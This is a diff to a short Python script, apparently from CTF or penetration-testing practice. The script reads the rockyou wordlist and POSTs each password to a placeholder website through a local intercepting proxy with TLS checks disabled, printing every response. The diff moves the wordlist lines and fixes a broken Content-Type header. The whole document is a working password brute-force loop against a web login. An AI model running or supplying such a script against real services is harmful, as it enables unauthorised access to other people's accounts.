@@ -1,6 +1,3 @@
-f = open('rock_you.txt')
-passwords = f.readlines()
-    
 import re
 import urllib
 import requests
@@ -12,7 +9,8 @@ proxy = {
     'http': 'http://127.0.0.1:8080'
 }
 
-
+f = open('rock_you.txt')
+passwords = f.readlines()
 for password in passwords:
 
     # Encode the pin 
@@ -22,8 +20,7 @@ for password in passwords:
     }
     
     r = requests.post("{website}/", proxies=proxy, data=urllib.parse.urlencode(params), verify=False, headers={
-    "Content-Type": "application/x-www-form-urlencode
-    d"
+    "Content-Type": "application/x-www-form-urlencoded"
     })
 
     print(f'Results for password = {password}:\n{r.content}\n', flush=True)
